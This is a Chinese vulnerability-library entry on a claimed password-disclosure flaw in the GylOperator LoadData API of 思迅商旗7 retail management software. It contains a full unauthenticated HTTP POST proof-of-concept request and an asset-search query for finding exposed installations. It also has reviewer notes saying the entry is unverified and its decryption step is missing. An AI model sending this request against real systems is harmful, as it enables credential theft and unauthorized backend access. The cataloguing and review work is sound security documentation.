---
source: "wy876 漏洞文库"
title: "思迅商旗7 GylOperator LoadData密码信息泄露声称"
product: "思迅商旗7"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "7系列构建未知"
prerequisites: "无Cookie请求，鉴权未证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vzyrz9h4ztl1gdca"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%80%9D%E8%BF%85%E5%95%86%E6%97%97/%E6%80%9D%E8%BF%85%E5%95%86%E6%97%97%E5%95%86%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F7GylOperator%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name=="
hunter: "app.name==\"思迅商旗\""
id: "vw-4dda426e45d77f58d74babd9"
entity_id: "ve-4dda426e45d77f58d74babd9"
schema_version: "1"
---

# 思迅商旗7 GylOperator LoadData密码信息泄露声称

## 条目说明

- 对象与具体问题：思迅商旗7；GylOperator LoadData密码信息泄露声称
- 版本、配置及部署条件：7系列构建未知
- 认证与权限前提：无Cookie请求，鉴权未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 正文直接说账号密码可登录但无响应/算法；解密小节空白，链路不完整
- rows1相对最小但需说明账号角色/密码格式，不能把哈希当明文
- 缺版本/修复，HTTP误标Java；与其他LoadData共享介绍但保留权限对象差异

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思迅商旗商业管理系统GylOperator存在信息泄露漏洞，攻击者可通过该漏洞在服务器端读取账户密码，从而登录后台。

## 二、影响版本
+ 思迅商旗商业管理系统7

## 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征


## 四、漏洞复现
```http
POST /api/GylOperator/LoadData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1
```

> 请求长度说明：原资料 Content-Length 为 68；静态长度已移除，应由客户端根据最终请求体的字节数生成。


解密


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vzyrz9h4ztl1gdca>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
